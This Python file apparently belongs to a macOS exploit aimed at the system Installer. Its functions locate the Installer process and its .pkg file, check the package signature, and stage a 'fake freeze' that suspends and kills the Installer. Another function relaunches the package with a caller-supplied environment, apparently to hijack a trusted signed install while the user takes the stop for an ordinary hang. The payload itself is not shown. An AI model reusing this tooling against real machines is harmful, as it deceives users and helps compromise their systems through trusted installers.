import time
import psutil
import subprocess
import os
import signal


def get_installer_pid() -> tuple:
    """
    Wait until Installer loads
    :return:
    """
    while True:
        for proc in psutil.process_iter():
            if proc.name() == "Installer":
                return proc.pid, proc.cmdline()
        time.sleep(1)


def get_sig(pkg_path: str) -> str:
    """
    Get the package sig
    :param pkg_path:
    :return:
    """
    out = subprocess.Popen(["pkgutil", "--check-signature", pkg_path], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

    stdout = out.communicate()[0]
    err = out.returncode

    if err:
        print(f"[-] Failed to check package sig:")
        exit(stdout)

    return stdout.decode()


def start_new_installer(pkg_path: str, env: dict) -> tuple:
    proc = subprocess.Popen(["open", "-F", f"{pkg_path}"], env=env)
    proc.communicate()
    return proc.returncode, proc.pid


def fake_hang(pid: int) -> None:
    # Check pid is valid
    os.kill(pid, 0)
    print(f"[*] Fake freeze...")
    os.kill(pid, signal.SIGSTOP)
    print("[+] Wait...")
    time.sleep(2)
    os.kill(pid, signal.SIGKILL)


def get_package_via_lsof(pid: int) -> tuple:
    """
    Installer absolutely refuses to open a file without .pkg (probably also .mpkg) as the extension,
    so this is a surprisingly robust way to find it. We only do it if the args way fails (loading
    from spotlight, for example, seems to break that)
    :param pid: The PID to get the package from
    :return:
    """
    # I've encountered a timing issue relating to Installer, so retry this until we find it. If we don't
    # have an opened .pkg after 10 seconds we're screwed anyway.
    i = 0
    pkg = None
    while i < 10 and not pkg:
        out = subprocess.Popen(["lsof", "-p", str(pid)], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)

        stdout = out.communicate()[0]
        err = out.returncode

        if err:
            print(f"[-] Failed to check package sig:")
            exit(stdout)
        packages = [line.strip()[line.strip().index("/"):] for line in stdout.decode().split("\n")
                    if line.rstrip().endswith(".pkg")]
        if not packages:
            time.sleep(1)
            print(f"[-] Waiting for pkg (attempt {i}+1)")
            i += 1
        else:
            pkg = packages[0]

    return pkg, get_sig(pkg)
